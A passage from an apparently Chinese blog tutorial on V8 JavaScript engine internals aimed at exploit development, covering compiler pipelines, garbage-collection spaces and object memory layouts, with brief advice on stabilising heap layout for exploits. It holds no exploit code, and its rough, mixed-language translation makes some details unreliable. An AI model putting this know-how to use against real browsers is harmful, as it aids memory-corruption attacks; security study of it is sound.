src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-013055.png" alt=""></p><h4 id="TurboFan的特征"><a href="#TurboFan的特征" class="headerlink" title="TurboFan的特征"></a>TurboFan的特征</h4><ul><li>Graph Building<ul><li>从AST创建一个JavaScript节点的graph<ul><li>JSAdd，JSCallFunction，JSLoadProperty，IfTrue，IfFalse等等</li></ul></li><li>在making graphs优化</li></ul></li><li>Optimization<ul><li>graph的各种优化</li></ul></li><li>Code Generation<ul><li>机器码生成</li></ul></li></ul><h4 id="TurboFan优化"><a href="#TurboFan优化" class="headerlink" title="TurboFan优化"></a>TurboFan优化</h4><ul><li>src/compiler/pipeline.cc参考<ul><li>inline<br>内联函数调用</li><li>trimming<br>未到达节点删除</li><li>type<br>类型推断</li><li>typed-lowering<br>根据类型将表达式和指令替换为更简单的处理</li><li>loop-peeling<br>取出循环内的处理。</li><li>loop-exit-elimination<br>删除Loop Exit</li><li>load-elimination<br>删除不必要的读取和检查</li><li>simplified-lowering<br>用更具体的值来进行指令的简单转换</li><li>generic-lowering<br>将JS前缀指令转换为更简单的调用和stub调用</li><li>dead-code-elimination<br>删除无法访问的代码</li></ul></li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-081152.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-082624.png" alt=""><br>文本框中的文字如下：<br><strong>细节</strong><br>出于某种原因，在名为GenerateCode()的函数中执行了对类型和graph的各种优化。<br>此外，尽管从CreateGraph()调用GenerateCode()，但这些函数原本应该是独立的。(在代码中还有三个独立的部分，job-&gt; CreateGraph()，job-&gt; OptimizeGraph()，job-&gt; GenerateCode()）<br>实际上，在V8的这个时间段中，每个phase都没有完全分离，因为优化和代码生成都是在CreateGraph()函数内部实现的。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-082716.png" alt=""></p><h4 id="Crankshaft-TurboFan检查"><a href="#Crankshaft-TurboFan检查" class="headerlink" title="Crankshaft/TurboFan检查"></a>Crankshaft/TurboFan检查</h4><ul><li>Crankshaft/TurboFan能够被确认使用，通过–trace-opt<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-084845.png" alt=""><br>上面框：大约调用函数10000次<br>下面框：Crankshaft被使用</li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-085002.png" alt=""><br>Crankshaft不能对包含with语句的函数进行优化，所以如果你在函数后添加add语句，TurboFan将会被调用。</p><ul><li><p>TurboFan还可以通过 –turbo-stats查看优化列表和统计数据<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-085250.png" alt=""></p></li><li><p>Confirm results with d8 –print_code等<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-085453.png" alt=""><br>Crankshaft, TurboFan, Inline Caching related, etc. can be confirmed considerably</p></li></ul><h3 id="编译器调用的流程"><a href="#编译器调用的流程" class="headerlink" title="编译器调用的流程"></a>编译器调用的流程</h3><h4 id="被调用"><a href="#被调用" class="headerlink" title="被调用"></a>被调用</h4><ul><li>参考samples/hello-world.cc<ul><li>它只涵盖main()<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-090144.png" alt=""><br>有各种各样的东西，但最重要的是Compile()和Run()</li></ul></li></ul><h4 id="调用堆栈查看"><a href="#调用堆栈查看" class="headerlink" title="调用堆栈查看"></a>调用堆栈查看</h4><ul><li><p>如何调用Full-Codegen</p><ul><li>描述了调用Compile函数时的转换<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-091306.png" alt=""></li></ul><ol><li>如果它是最新的源代码，它会跳转到ParseProgram()而不是ParseStatic()，但它不会有太大的改变，因为它最终会达到AST方向。</li><li>如果它是最新的源代码，它将跳转到GenerateUnoptimizedCode（）而不是CompileBaselineCode（），并使用Ignition注册编译作业。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-091654.png" alt=""></li></ol></li><li><p>调用Run()函数时的转换如下<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-092236.png" alt=""><br>CALL_GENERATED_CODE是一个宏，通过这个宏，在跳转到由Full-Codegen生成的机器语言（JIT）的阶段，优化编译器不会被调用</p></li><li>如何调用Crankshaft / TurboFan<ul><li>Called after runtime-profiler decides whether optimization is possible<ul><li>Optimization availability determination is done automatically in another thread during Run ()<ul><li>因此，使用V8作为库的程序员<strong>基本上不会主动调用执行优化的函数</strong></li><li>当然，开发V8的程序员有可能自己故意调用一个根据选项执行优化的函数，但你在exploit的角度不用去考虑它。</li></ul></li></ul></li></ul></li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-092812.png" alt=""><br>在确定使用UseTurboFan()的优化编译器后，将创建Crankshaft / TurboFan作业。<br>之后，job-&gt;CreateGraph()实际触发优化编译</p><h2 id="阅读V8的源码"><a href="#阅读V8的源码" class="headerlink" title="阅读V8的源码"></a>阅读V8的源码</h2><p>在exploit中，您还需要阅读源代码.<br>源代码(samples/hello-world.cc),我们还介绍了用于阅读和调试源代码的重要概念<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-121221.png" alt=""><br>顺便说一下，ToLocalChecked()是一个no-NULL检查函数。</p><p>本节介绍以下内容<br>我只是总结了我不知道的概念<br>从exploit的角度来看，它们都不是那么重要，但是最好从源码上了解</p><ul><li>Handle/HandleScope</li><li>Context</li><li>Isolate</li><li>Platform</li><li>Interpreter</li><li>blob</li><li>ICU</li><li>third_party</li><li>tools</li></ul><p>参考资料：<a href="https://github.com/v8/v8/wiki/Embedder&#39;s-Guide" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/Embedder&#39;s-Guide</a></p><h3 id="Handle-HandleScope"><a href="#Handle-HandleScope" class="headerlink" title="Handle/HandleScope"></a>Handle/HandleScope</h3><ul><li>Handle<ul><li>要启用GC跟踪，指针包装类型<ul><li>为了对应任何类型的指针，请使用C++模板</li><li>在源代码中，所有Object都使用此Handle<t>类型进行管理</t></li><li>GC有可能移动Object的位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-124518.png" alt=""><br>即使GC移动该Object，由于handle不移动，所以没有不一致</li></ul></li><li>常用Handle<ul><li>Handle<t><ul><li>Abstract class</li></ul></t></li><li>Local<t><ul><li>Temporary Handle, 保留在stack上</li><li><strong>使用后面将介绍的HandleScope进行生命周期管理</strong></li></ul></t></li><li>MaybeLocal<t><ul><li>它与Local<t>相同，但在使用前检查它是否为空</t></li></ul></t></li><li>Persistent<t><ul><li>一个persistent Handle,保留在heap上</li><li>代码编写器使用Persistent::Reset（）管理生命周期</li></ul></t></li></ul></li></ul></li><li>HandleScope<ul><li>handle总结<ul><li>Temporary Handle such as Local <t>, MaybeLocal<t></t></t></li><li>在声明HandleScope时，块中的每个handle都会自动关联</li></ul></li><li><strong>当HandleScope超出范围时，它会处理释放handle</strong><ul><li>返回函数时，结束{}时，等</li><li>用所有使用的handle来描述释放处理是低效的</li><li>使用HandleScope的析构函数，GC负责实际的释放处理</li></ul></li><li>参考以下的文件<ul><li>include/v8.h，src/handles.h</li></ul></li></ul></li></ul><h3 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><ul><li>在一个V8实例中创建多个执行环境的机制<ul><li>您可以在一个线程中同时运行彼此独立的JavaScript代码</li></ul></li><li>每个Context对象都有一个全局的Root-Object</li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-132114.png" alt=""><br>左边：每个context都有一个Root-Object，并且彼此独立（在本例中，context是嵌套的，但Root-Object正确切换）<br>右边：总之，它实现了环境的切换。 我们希望分别通过window，iframe和extended script来独立保护环境。所谓的origin也是在Context中定义的，并且从一个Context到另一个Context的访问不能被默认完成。</p><h3 id="Isolate"><a href="#Isolate" class="headerlink" title="Isolate"></a>Isolate</h3><ul><li>Instance of V8 itself<ul><li>context是在同一个instance中实现不同的执行环境</li><li>当你想运行自己的多个实例时使用Isolate<ul><li>为了适应多线程</li></ul></li></ul></li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-133452.png" alt=""></p><h3 id="Platform"><a href="#Platform" class="headerlink" title="Platform"></a>Platform</h3><ul><li>It seems to define the operating environment (it seems)<ul><li>线程相关<ul><li>决定后台线程和前台线程</li><li>管理线程池</li></ul></li><li>任务队列管理</li><li>事件追踪</li></ul></li></ul><p><strong>我没有很好理解，因为没有真实的信息</strong></p><p>参考</p><ul><li>include/v8-platform.h</li><li>src/libplatform/default-platform.cc</li></ul><h3 id="Interpreter"><a href="#Interpreter" class="headerlink" title="Interpreter"></a>Interpreter</h3><ul><li>In V8, two Interpreters are prepared<ul><li>d8<ul><li>构建src/d8.cc，可以用参数指定各种选项</li><li>debug-shell d8 in the sense of V8</li><li>如果你不用一个文件作为参数去运行它，它将作为interactive interpreter运行。</li><li>当文件被指定为参数时，它将被解析为JavaScript并执行</li></ul></li><li>shell<ul><li>构建samples/shell.cc</li><li>主要操作与d8相同，但功能减少且轻量级</li><li>它可以用于对CTF中的V8的jsp问题进行调试</li></ul></li></ul></li></ul><h3 id="blob"><a href="#blob" class="headerlink" title="blob"></a>blob</h3><ul><li>关于snapshot文件<ul><li>V8在初始化时在内部生成内置JavaScript代码<ul><li>尽管这些代码可以每次使用时进行编译，但是效率不高。</li></ul></li><li>所以在编译阶段预先准备好他们。<ul><li>它只需要在启动时读取，因此初始化变得更快</li><li>在构建V8时，他们一起生成</li></ul></li><li>snapshot可以在程序内部/外部进行<ul><li>当snapshot文件被放置在外部的时候，就是blob</li><li>There are two of natives_blob.bin and snapshot_blob.bin<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-164154.png" alt=""></li></ul></li></ul></li></ul><h3 id="ICU"><a href="#ICU" class="headerlink" title="ICU"></a>ICU</h3><ul><li>International Components for Unicode<ul><li>也就是说，与Unicode有关的外部库</li></ul></li><li>参考下面的链接：<ul><li><a href="https://github.com/v8/v8/wiki/i18n-support" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/i18n-support</a></li><li>src/icu_util.cc</li></ul></li></ul><h3 id="third-party"><a href="#third-party" class="headerlink" title="third_party"></a>third_party</h3><ul><li>和v8捆绑的工具(=被用来构建等)<ul><li>icu, binutils, llvm, etc.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-165002.png" alt=""></li></ul></li><li>它可以根据需要进行更换<ul><li>在使用Ubuntu 16.04进行构建时，由于其下属的ld.gold报错，因此通过系统链接程序的符号链接（/usr/bin/ld.gold）<ul><li>ld.gold是Google在2012年左右制作的ld的高速版本</li></ul></li><li>使用GYP_DEFINES，您也可以替换环境变量</li></ul></li></ul><h3 id="tools"><a href="#tools" class="headerlink" title="tools"></a>tools</h3><ul><li>GDB扩展命令已准备好用于调试目的<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-165454.png" alt=""><ul><li>gdb-peda$ source tools/gdbinit</li><li>gdb-peda$ source tools/gdb-v8-support.py</li><li>如果你这样做，你可以增加gdb命令<ul><li>也许你可以使用Ok</li></ul></li><li>tools/ Because there are various other things under his eyes</li></ul></li><li>但是，由于我们的案例是在2016年，因此需要进行一些修改<ul><li>gdbinit<ul><li>由于出现与命名空间相关的错误，因此使用“’修补它即可（？？？）</li></ul></li><li>gdb-v8-support.py<ul><li>由于python 3语法错误出现，所以可以在打印语句OK中放入括号<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-165926.png" alt=""></li></ul></li><li>此外，该文件的内容在最新的V8中已更改<ul><li>我还没有确认这一点。</li></ul></li></ul></li><li>For example, v8print and job commands display HeapObject cleanly<ul><li>对象的结构将在后面描述</li><li>由于map有各种标志，最好在这里查看<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-173611.png" alt=""></li></ul></li></ul><ol><li>例如，[0xdeadbee，0xdeadbeef，“hoge”]<br>显示FixedArray（减去0x14，因为它指向FixedArray的第一个偏移量）</li><li>我试图显示FixedArray的Map的内容</li><li>实际上，我不必费心使用v8print命令，但我觉得直接调用内部函数可以调用__gdb_print_v8_object（address），如果我传入一个奇怪的地址，我无法通过SEGV恢复它，所以我直接看内存,它会更安全。</li></ol><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>其他的细节<ul><li>Macro-intensive use<ul><li>如果对源代码进行grep找不到定义，则可能有宏</li><li>寻找宏的定义是很好的（在源码中的某处#define 〜）</li><li>In particular, many macros based on the token concatenation operator (##) are used<ul><li><code>#define HOGE(name,type) hoge_name_##type();</code></li><li>当我找不到它时，一般会有很多模式</li></ul></li></ul></li><li><code>__asm __（“int 3”）</code>不能嵌入到IC或机器语言生成系统的功能中<ul><li>做一个blob作为构建过程的一部分</li><li>目前这些代码似乎被使用，并且在很多情况下构建失败</li></ul></li><li>namespace<ul><li>i是v8::internal的别名<ul><li>namespace i = v8::internal;(src/globals.h)</li></ul></li></ul></li><li>Changes will be made immediately<ul><li>你现在看的源码和最新的可能大有不同。<ul><li>如果您认为将其与最新版本进行比较很有趣</li><li><a href="https://cs.chromium.org/chromium/src/v8/" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/v8/</a></li></ul></li></ul></li><li>以下是非常有用的<br><a href="https://github.com/danbev/learning-v8/blob/master/README.md" target="_blank" rel="noopener">https://github.com/danbev/learning-v8/blob/master/README.md</a></li></ul></li></ul><h2 id="关于V8的GC"><a href="#关于V8的GC" class="headerlink" title="关于V8的GC"></a>关于V8的GC</h2><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://github.com/thlorenz/v8-perf/blob/master/gc.md" target="_blank" rel="noopener">https://github.com/thlorenz/v8-perf/blob/master/gc.md</a><br><a href="https://github.com/joyeecheung/v8-gc-talk" target="_blank" rel="noopener">https://github.com/joyeecheung/v8-gc-talk</a><br><a href="https://www.youtube.com/watch?v=DSBLAG2IvsY" target="_blank" rel="noopener">https://www.youtube.com/watch?v=DSBLAG2IvsY</a></p><h3 id="垃圾收集器（GC）"><a href="#垃圾收集器（GC）" class="headerlink" title="垃圾收集器（GC）"></a>垃圾收集器（GC）</h3><ul><li>另一个重要组件是GC<ul><li>一种在V8中单独管理JavaScript对象（称为HeapObject）的机制<ul><li>如何检测废弃的对象并自动释放它们</li></ul></li><li>使用与Linux heap不同的区域</li></ul></li><li><p>GC区域</p><ul><li>除heap以外，还有多个由mmap存放的区域</li><li>V8内部使用的各种HeapObject被保留在这个区域<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-11-025437.png" alt=""></li></ul></li><li><p>heap区域</p><ul><li>如果不是js object（=不应该由GC管理），用c++语言管理普通object</li><li><strong>虽然是一个JavaScript object，但有些例外，存放在heap而不是HeapObject（例如JSArrayBuffer的BackingStore）</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-11-025736.png" alt=""></li></ul></li></ul><p>GC中有2种generation(= regions with different management methods)</p><ol><li>Young Generation</li><li>Old Generation</li></ol><p>根据GC中object的生存时间，它被分为两类generation ，Young/Old (and New/Old described later)<br>这不是关于V8版本之间的区别<br>除此之外，还有一些区域不属于任何一个generation<br>为了方便起见，它被写为Other，但是其实是关于Large Object Space</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-11-032534.png" alt=""></p><p>在源代码中，有些地方包含Old generation的large object space的描述，但基本上认为它们是不同的东西</p><h3 id="Young-Generation"><a href="#Young-Generation" class="headerlink" title="Young Generation"></a>Young Generation</h3><ul><li><p>New Space</p><ul><li>新创建的object被保留在这里，并且受到GC管理</li><li>Almost all objects</li><li>code object，map object和large object被排除在外<ul><li>除了看源码之外还有其他的东西，但是从exploit的视角看不重要</li></ul></li></ul></li><li><p>The GC algorithm is Cheney’s algorithm</p><ul><li><p>为了使用这种算法，它进一步分为两个区域</p><ul><li>ToSpace</li><li>FromSpace<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-11-062509.png" alt=""></li></ul></li><li><p>这个GC在源码里被称为Scavenge</p><ul><li><strong>我会解读它，因为它很重要。</strong></li><li>这一次我会解读2016年的GC，但最近这个算法发生了变化，与并行化兼容<br>参考资料：<a href="https://v8project.blogspot.jp/2017/11/" target="_blank" rel="noopener">https://v8project.blogspot.jp/2017/11/</a></li></ul></li></ul></li><li>Cheney’s algorithm<ul><li>Each object is reserved from the beginning of ToSpace<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-11-062616.png" alt=""></li><li>当memory exhaustion（空间用罄）时候，GC被调用</li><li>主线程的操作(Javascript执行的线程)被暂停<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-11-062838.png" alt=""></li><li>Switch To Space and From Space</li><li>Actually dealing with pointer swap (flip)<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-11-070014.png" alt=""></li><li>仅将living object复制到To Space<ul><li>首先，确保live (= alive), copy one starting object。<ul><li>有各种各样的root objects (such as global objects, built-in objects, local objects within the scope of living, etc. ）<br>有各种各样的说法，详情请参阅heap/heap.cc的IterateRoots()。</li><li>从Old side可以访问的object (由后面讲解的Write Barrier mechanism管理), etc.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-11-070702.png" alt=""></li></ul></li><li>顺次复制living的object。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-11-071307.png" alt=""><ul><li>还有一些要复制到old generation的object<br> <strong>正如我们后面将会看到的那样,两次在young generation的GC中幸存下来的对象，被复制到old generation的空间而不是复制到ToSpace</strong></li></ul></li><li>完成后，重新选择root并重复复制。</li></ul></li><li>再次分配之前未分配完成的obj-e<ul><li>From Space中还有garbage存在，但是因为我们不会再次使用它们，所以无所谓。</li><li>之后，每次GC发生时，都会重复上面这一系列的流程<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-11-072518.png" alt="">    </li></ul></li></ul></li></ul><h3 id="Old-Generation"><a href="#Old-Generation" class="headerlink" title="Old Generation"></a>Old Generation</h3><ul><li>old space<ul><li>long-lived objects存放的区域<ul><li>New Space中, 在两次GC之后存活下来的object <ul><li>更多细节参考Heap::ShouldBePromoted()</li></ul></li><li>old space发生GC的频率比new space少（取决于使用过程）<ul><li>如果一个object被移动到old space，该object不会受到GC更改layout的影响<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-11-191321.png" alt=""></li></ul></li></ul></li></ul></li><li>code space<ul><li>仅适用于JIT的code object<ul><li>由于code object是RWX，因此它从一开始就保留在此区域中<ul><li>由于它是JIT代码，因此不仅要读取（R）写入（W），还要执行（X），因此memory permissions与其他的地方不同。</li></ul></li></ul></li></ul></li><li><p>Map Space</p><ul><li>仅Map object<ul><li>出于GC效率的考虑，Map object从一开始就位于此区域<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-11-192033.png" alt=""></li></ul></li></ul></li><li><p>old generation的GC算法是Mark-Sweep-Compact</p><ul><li>除New Space区域以外的所有算法</li><li>由于它与Exploit无关，因此省略了详细信息<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-11-192358.png" alt=""></li></ul></li></ul><h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><ul><li>Large Object Space<ul><li>保留600KB或更大的object的区域<ul><li>它由mmap直接分配</li><li>如果有多个存放区域，请使用链表进行管理</li><li>它不在GC中移动</li></ul></li></ul></li></ul><h3 id="Write-Barrier"><a href="#Write-Barrier" class="headerlink" title="Write Barrier"></a>Write Barrier</h3><ul><li><a href="https://v8project.blogspot.jp/2016/04/jank-busters-part-two-orinoco.html" target="_blank" rel="noopener">https://v8project.blogspot.jp/2016/04/jank-busters-part-two-orinoco.html</a></li><li><p><a href="https://www.slideshare.net/NodejsFoundation/are-your-v8-garbage-collection-logs-speaking-to-youjoyee-cheung-alibaba-cloudalibaba-group" target="_blank" rel="noopener">https://www.slideshare.net/NodejsFoundation/are-your-v8-garbage-collection-logs-speaking-to-youjoyee-cheung-alibaba-cloudalibaba-group</a></p></li><li><p>对应于从old/large一侧，指向young一侧的object的场合</p><ul><li>当你在Young进行GC时，Young side的object会移动<ul><li>因此old/large一侧所持有的指针就变成无效的了</li><li>虽然有必要对old/large一侧中的指针进行修正，但是希望在young的gc过程中避免对old/large进行扫描</li></ul></li><li>对这样的指针事先使用store buffer + remembered set进行管理<ul><li>在young进行gc时，利用这些的信息对old/large一侧的指针进行处理<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-12-071623.png" alt=""></li></ul></li></ul></li></ul><h3 id="从Exploit的角度来看"><a href="#从Exploit的角度来看" class="headerlink" title="从Exploit的角度来看"></a>从Exploit的角度来看</h3><ul><li>In case of exploit repeating memory allocation/release<ul><li>When GC runs at Young Generation, memory layout collapses<ul><li>It is more stable to intentionally activate the GC in advance and move the object as much as possible to Old Generation</li><li>In order to cause GC, it is sufficient to secure a lot of memory (= non-large) in detail</li></ul></li></ul></li><li>In case of heap BOF type exploit<ul><li>Each object does not have metadata for GC (concrete example will be described later)<ul><li>Meta data such as size and prev_size in the malloc chunk are not particularly used for GC applications</li><li>Since the reserved JS object is used like a structure, there are various information inside the JS object, but there are no headers in the JS object itself, and each JS object is secured consecutively</li></ul></li><li>In other words, the technique of the metadata destroying system which is well-known in the Linux heap basically does not exist on the GC<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-12-081239.png" alt=""></li></ul></li></ul><h2 id="v8对象模型"><a href="#v8对象模型" class="headerlink" title="v8对象模型"></a>v8对象模型</h2><h3 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://steps.dodgson.org/bn/2008/09/07/" target="_blank" rel="noopener">http://steps.dodgson.org/bn/2008/09/07/</a></p><h3 id="V8的object"><a href="#V8的object" class="headerlink" title="V8的object"></a>V8的object</h3><ul><li>Object<ul><li>v8自己创建的各种各样的类<ul><li>和GC合作</li></ul></li><li>针对C++类结构制作一个触发器<ul><li>例如，V8的object没有成员变量</li><li>它既没有虚函数，也没有构造函数/析构函数</li><li></li></ul></li><li>细节参考src/objects.h,src/objects-inl.h等<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-12-102645.png" alt=""></li></ul></li><li>Exploit<ul><li>了解每个object的内存结构非常重要</li><li>在本文件中，我们将主要讲述下面的内容<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-12-124349.png" alt=""><h3 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-133831.png" alt=""></li></ul></li></ul><h3 id="Object和Tagged-Value"><a href="#Object和Tagged-Value" class="headerlink" title="Object和Tagged Value"></a>Object和Tagged Value</h3><h4 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h4><ul><li>Object<ul><li>它由以下两种类型组成</li><li>Smi(Small Integer)<ul><li>整数值<ul><li>整数由带符号的31位范围表示（在32位环境的情况下）</li><li>整数由带符号的32位范围表示（在64位环境的情况下）</li></ul></li></ul></li><li>HeapObject<ul><li>除整数值之外的其他类<ul><li>也适用于不能在Smi范围内表达的整数<ul><li>Double value and hold at the end of the pointer (= HeapNumber object)</li></ul></li><li>始终有一个指向Map的指针</li></ul></li><li>由于HeapObject基本上由GC管理，因此它位于GC区域（它不存放在堆区域）</li></ul></li></ul></li></ul><h4 id="Smi"><a href="#Smi" class="headerlink" title="Smi"></a>Smi</h4><p>如果一个成员的值是一个整数，那么存储它的速度会更快<br>这就是使用Smi的原因（我认为这是原因）</p><ul><li><p>对于使用指针来创建一个整数对象(B)的实现，如图<br>指针必须被追踪一次，内存访问两次（慢）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-12-141551.png" alt=""></p></li><li><p>对于省略了指向整数对象(B)的指针并且整数直接存放在内部的实现，如图<br>指针应该指向的整数值在V8中被称为Smi<br>没有必要跟随指针，内存访问执行一次（快速）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-12-141811.png" alt=""></p></li></ul><h4 id="Tagged-Values"><a href="#Tagged-Values" class="headerlink" title="Tagged Values"></a>Tagged Values</h4><ul><li><p>Tagged Values</p><ul><li>同时表示指向Smi和HeapObject的指针的机制<ul><li>但是，不可能区分它们是整数值还是指针<ul><li>低1位(LSB)是一个标志</li></ul></li></ul></li></ul></li><li><p>Smi(=Object)</p><ul><li>如果LSB为0，则可以通过右移1位获得原始值<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-073048.png" alt=""></li><li>如果LSB为0，则可以通过右移32位获得原始值<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-073104.png" alt=""></li></ul></li><li><p>指向HeapObject的指针</p><ul><li>32位<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-073143.png" alt=""></li><li>64位<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-073127.png" alt=""><br>  由于GC上的chunk在32位环境中的4字节对齐，64位环境中是8字节对齐的，因此LSB始终为0。也就是说，当它存储在内存中时，将其LSB设置为1即代表指针。</li></ul></li></ul><h3 id="HeapNumber"><a href="#HeapNumber" class="headerlink" title="HeapNumber"></a>HeapNumber</h3><ul><li>对象的值为double<ul><li>数字表达式不能在Smi范围内表达</li><li>继承Object, HeapObject<ul><li>内存结构如下所示（64位环境下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-074944.png" alt=""><br>V8的HeapObject完全没有任何成员变量，它完全由偏移量独立表示。<br>为了画起来方便，我们将其视为变量名称，并如右图所示表示（对于后续幻灯片也是如此）</li></ul></li></ul></li><li>实际演示<ul><li>Smi值(0xdeadbee)和double值(0xdeadbeef，由于它大于0x7fffffff，非Smi)存放在数组中<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-080724.png" alt=""><br>搜索</li></ul></li><li>由于0xdeadbee是Smi，因此可以通过在内存中搜索，来查找存储在数组中的值。（换句话说，直接看数组里对应的值就行了）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-081323.png" alt=""></li><li>0xdeadbee（Smi）之后的元素应该是0xdeadbeef（HeapNumber）<br>0x41ebd5b7dde00000是0xdeadbeef的double值表示<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-081433.png" alt=""></li><li>HeapNumber对象和其他对象连续，保证没有任何间隙<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-083012.png" alt=""></li></ul><h3 id="PropertyCell"><a href="#PropertyCell" class="headerlink" title="PropertyCell"></a>PropertyCell</h3><ul><li>Object meaning variable<ul><li>继承Object，HeapObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-084028.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放Smi值(0xdeadbee)</li><li>使用0xdeadbee搜索此PropertyCell的在内存中的位置</li><li>尝试覆盖变量的值<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-084248.png" alt=""></li><li>由于0xdeadbee是Smi，它的值可以通过在内存中搜索找到。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-084442.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-084529.png" alt=""></li><li>更改为字符串<ul><li>如果你像以前一样检查相同的地址，则kValueOffset所保持的值会更改</li><li>指向的地址是一个表示“hoge”的String对象（String对象的细节将在后面描述）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-084737.png" alt=""></li></ul></li></ul></li></ul><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><ul><li>保存字符串的对象<ul><li>继承Object, HeapObject, Name<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-085209.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放在数组中的字符串“hoge”，“fuga”</li><li>用0xdeadbee查找这个数组的内存位置</li><li>由于0xdeadbee是Smi，因此你可以发现这个在数组中的值，通过在内存中搜索。基于此，确定数组的内存位置</li><li>跟在0xdeadbee（Smi）之后的元素应该是一个String对象，如“hoge”或“fuga”<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-124837.png" alt=""></li><li>“hoge”和“fuga”连续存放，没有缺口。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-125413.png" alt=""></li></ul></li></ul><h3 id="Oddball"><a href="#Oddball" class="headerlink" title="Oddball"></a>Oddball</h3><ul><li><p>表示特殊值的对象，例如true，false，undefined</p><ul><li>继承object，HeapObject<ul><li>内存结构如下（在64位环境的情况下）</li></ul></li></ul></li><li><p>实际演示</p><ul><li>确保true，false等在数组中<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-133139.png" alt=""></li><li>用0xdeadbee查找这个数组的内存位置</li><li>0xdeadbee（Smi）的下一个元素应该是一个Oddball对象，如true或false<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-133222.png" 